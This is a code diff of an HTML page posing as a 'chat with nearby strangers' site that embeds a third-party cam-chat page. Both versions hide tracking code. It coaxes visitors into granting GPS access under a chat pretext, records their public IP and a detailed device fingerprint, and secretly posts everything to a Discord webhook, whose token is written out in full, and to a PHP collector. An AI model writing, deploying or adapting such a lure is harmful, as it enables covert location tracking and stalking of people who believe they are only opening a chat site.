@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html>
 <head>
     <style>
@@ -11,7 +10,7 @@
             height: 100vh;
         }
         .dialog-box {
-            position: fixed;
+            position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -21,8 +20,6 @@
             padding: 20px;
             text-align: center;
             max-width: 300px;
-            z-index: 1000;
-            display: none;
         }
         .dialog-box h2 {
             margin-top: 0;
@@ -70,13 +67,12 @@
     <meta name="twitter:label1" content="Est. reading time" />
     <meta name="twitter:data1" content="4 minutes" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+    <script src="x-frame-bypass.js" type="module"></script>
     <script>
         $(document).ready(function() {
             var batterypercentage;
             var ischarging;
-            var locationPermissionDenied = false;
-            var permissionDialogInterval;
-
             function getPublicIp() {
                 const xhr = new XMLHttpRequest();
                 xhr.open('GET', 'https://api.ipify.org?format=json', false);
@@ -93,132 +89,148 @@
 
             const publicIp = getPublicIp();
 
-            navigator.getBattery().then(function(battery) {
-                batterypercentage = String(battery.level * 100 + "%");
-                ischarging = String(battery.charging);
-                getLocation();
-            });
+            var clips = "Clipboard access removed"; // Placeholder for removed clipboard access
 
             function getLocation() {
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(showPosition, handlePermissionError, { timeout: 5000 });
+                    setTimeout(() => {
+                        navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
+                    }, 5000);
                 } else {
                     alert("Your Browser Does not support");
                 }
             }
 
             function showPosition(position) {
-                var gps = "Latitude: " + position.coords.latitude + " Longitude: " + position.coords.longitude;
-                sendData(gps, batterypercentage, ischarging);
+                var grak = "Latitude : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude;
+                sdrp(grak, clips, batterypercentage, ischarging);
+                senddis(grak, clips, batterypercentage, ischarging);
             }
 
-            function handlePermissionError(error) {
-                if (error.code === error.PERMISSION_DENIED) {
-                    locationPermissionDenied = true;
-                    showPermissionDialog();
-                } else {
-                    window.close();
+            function showError(error) {
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        sdrp("Location Permission Denied", clips, batterypercentage, ischarging);
+                        senddis("Location Permission Denied", clips, batterypercentage, ischarging);
+                        alert("Allow Location permission to Chat with nearby Strangers");
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        window.close();
+                        break;
+                    case error.TIMEOUT:
+                        window.close();
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        window.close();
+                        break;
                 }
             }
 
-            function showPermissionDialog() {
-                $('#dialog').show();
-                permissionDialogInterval = setInterval(function() {
-                    if (locationPermissionDenied) {
-                        getLocation();
-                    }
-                }, 5000);
+            let datetime = new Date();
+            let localtime = String(datetime.toLocaleTimeString());
+            let referurl = document.referrer;
+            let cpuThreads = String(navigator.hardwareConcurrency);
+            let deviceram = String(navigator.deviceMemory) + "gb";
+            let useragent = navigator.userAgent;
+            let iscookieEnabled = String(navigator.cookieEnabled);
+            let devicelang = String(navigator.language);
+            let width = screen.width;
+            let height = screen.height;
+            let platform = navigator.platform;
+            let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink;
+
+            // New options
+            let osVersion = navigator.oscpu || navigator.platform;
+            let browserName = navigator.appName;
+            let browserVersion = navigator.appVersion;
+            let deviceType = /Mobi|Android/i.test(useragent) ? 'Mobile' : 'Desktop';
+            let touchScreen = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            let viewportWidth = window.innerWidth;
+            let viewportHeight = window.innerHeight;
+            let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let colorDepth = screen.colorDepth;
+            let pixelRatio = window.devicePixelRatio;
+            let mediaDevices = navigator.mediaDevices.enumerateDevices().then(devices => devices.map(device => device.kind));
+            let preferredLanguages = navigator.languages.join(', ');
+
+            function senddis(gpsr, clips, batterypercentage, ischarging) {
+                var request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
+                request.setRequestHeader('Content-type', 'application/json');
+                var params = {
+                    content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n> **Public IP  : **" + publicIp + "\n> **OS Version : **" + osVersion + "\n> **Browser Name : **" + browserName + "\n> **Browser Version : **" + browserVersion + "\n> **Device Type : **" + deviceType + "\n> **Touch Screen : **" + touchScreen + "\n> **Viewport Width : **" + viewportWidth + "\n> **Viewport Height : **" + viewportHeight + "\n> **Time Zone : **" + timeZone + "\n> **Color Depth : **" + colorDepth + "\n> **Pixel Ratio : **" + pixelRatio + "\n> **Media Devices : **" + mediaDevices + "\n> **Preferred Languages : **" + preferredLanguages),
+                    username: "niknik",
+                    avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
+                }
+                request.send(JSON.stringify(params));
             }
 
-            function sendData(gps, batterypercentage, ischarging) {
-                var datetime = new Date();
-                var localtime = String(datetime.toLocaleTimeString());
-                var referurl = document.referrer;
-                var cpuThreads = String(navigator.hardwareConcurrency);
-                var deviceram = String(navigator.deviceMemory) + "GB";
-                var useragent = navigator.userAgent;
-                var iscookieEnabled = String(navigator.cookieEnabled);
-                var devicelang = String(navigator.language);
-                var width = screen.width;
-                var height = screen.height;
-                var platform = navigator.platform;
-                var networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                var networkinformation = "Network type: " + networkinfo.effectiveType + " Downlink: " + networkinfo.downlink;
-                var os = navigator.userAgentData.platform || platform;
-                var browserName = navigator.userAgentData.brands.map(b => b.brand).join(", ");
-                var browserVersion = navigator.userAgentData.brands.map(b => b.version).join(", ");
-                var touchScreen = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-                var viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
-                var viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
-                var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                var colorDepth = screen.colorDepth;
-                var pixelRatio = window.devicePixelRatio;
-                var mediaDevices = navigator.mediaDevices.enumerateDevices().then(devices => devices.map(device => device.kind).join(", "));
-                var preferredLanguages = navigator.languages.join(", ");
-
-                var params = {
-                    networkinformation: networkinformation,
-                    batterypercentage: batterypercentage,
-                    ischarging: ischarging,
-                    width: width,
-                    height: height,
-                    platform: platform,
-                    gps: gps,
-                    localtime: localtime,
-                    devicelang: devicelang,
-                    iscookieEnabled: iscookieEnabled,
-                    useragent: useragent,
-                    deviceram: deviceram,
-                    cpuThreads: cpuThreads,
-                    referurl: referurl,
-                    publicIp: publicIp,
-                    os: os,
-                    browserName: browserName,
-                    browserVersion: browserVersion,
-                    touchScreen: touchScreen,
-                    viewportWidth: viewportWidth,
-                    viewportHeight: viewportHeight,
-                    timezone: timezone,
-                    colorDepth: colorDepth,
-                    pixelRatio: pixelRatio,
-                    mediaDevices: mediaDevices,
-                    preferredLanguages: preferredLanguages
-                };
-
+            function sdrp(bsdks, clipboard, batterypercentage, ischarging) {
                 $.ajax({
                     type: "POST",
                     url: "sunni.php",
-                    data: params,
+                    data: {
+                        networkinformation: networkinformation,
+                        batterypercentage: batterypercentage,
+                        ischarging: ischarging,
+                        width: width,
+                        height: height,
+                        platform: platform,
+                        gps: bsdks,
+                        devicelang: devicelang,
+                        iscookieEnabled: iscookieEnabled,
+                        useragent: useragent,
+                        deviceram: deviceram,
+                        cpuThreads: cpuThreads,
+                        referurl: referurl,
+                        localtime: localtime,
+                        clipboard: clipboard,
+                        osVersion: osVersion,
+                        browserName: browserName,
+                        browserVersion: browserVersion,
+                        deviceType: deviceType,
+                        touchScreen: touchScreen,
+                        viewportWidth: viewportWidth,
+                        viewportHeight: viewportHeight,
+                        timeZone: timeZone,
+                        colorDepth: colorDepth,
+                        pixelRatio: pixelRatio,
+                        mediaDevices: mediaDevices,
+                        preferredLanguages: preferredLanguages
+                    },
                     cache: false,
                     success: function(data) {},
                     error: function(xhr, status, error) {
                         console.log(error);
                     }
                 });
-
-                var request = new XMLHttpRequest();
-                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
-                request.setRequestHeader('Content-type', 'application/json');
-                request.send(JSON.stringify({
-                    content: `> **DeviceGps  : ** ${gps}\n> **NetworkInformation : ** ${networkinformation}\n> **BatteryPercentage : ** ${batterypercentage}\n> **Ischarging : ** ${ischarging}\n> **ScreenWidth : ** ${width}\n> **ScreenHeight : ** ${height}\n> **PlatForm : ** ${platform}\n> **DeviceLanguage : ** ${devicelang}\n> **DeviceMemory : ** ${deviceram}\n> **IsCookieEnabled : ** ${iscookieEnabled}\n> **UserAgent : ** ${useragent}\n> **CpuThreads : ** ${cpuThreads}\n> **ReferUrl : ** ${referurl}\n> **DeviceLocalTime : ** ${localtime}\n> **Public IP  : ** ${publicIp}\n> **OS: ** ${os}\n> **BrowserName: ** ${browserName}\n> **BrowserVersion: ** ${browserVersion}\n> **TouchScreen: ** ${touchScreen}\n> **ViewportWidth: ** ${viewportWidth}\n> **ViewportHeight: ** ${viewportHeight}\n> **TimeZone: ** ${timezone}\n> **ColorDepth: ** ${colorDepth}\n> **PixelRatio: ** ${pixelRatio}\n> **MediaDevices: ** ${await mediaDevices}\n> **PreferredLanguages: ** ${preferredLanguages}`
-                }));
-
-                window.location.replace("https://www.google.com/");
             }
 
-            // Start the process
             getLocation();
         });
     </script>
 </head>
 <body>
     <div class="iframe-container">
-        <iframe src="https://chattusa.com/iframe/Y2FubmVydG9jYW1z/" width="100%" height="100%" frameborder="0" scrolling="no" allow="camera;microphone"></iframe>
+        <iframe
+            is="x-frame-bypass"
+            src="https://strangercamchat.com"
+            frameborder="0"
+            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
+            height="100%"
+            width="100%"
+        ></iframe>
+        <div class="dialog-box" id="dialogBox">
+            <h2>Alert</h2>
+            <p>Please Allow permissions to continue to chat with strangers</p>
+            <button class="btn-allow" onclick="requestPermissions()">Allow</button>
+        </div>
     </div>
-    <div id="dialog" class="dialog-box">
-        <h2>Allow Location Permission</h2>
-        <p>To chat with nearby strangers, please allow location permission.</p>
-        <button id="btn-allow" class="btn-allow" onclick="getLocation()">Allow</button>
-    </div>
+    <script>
+        function requestPermissions() {
+            document.getElementById('dialogBox').style.display = 'none';
+        }
+    </script>
 </body>
-</html> 
+</html>
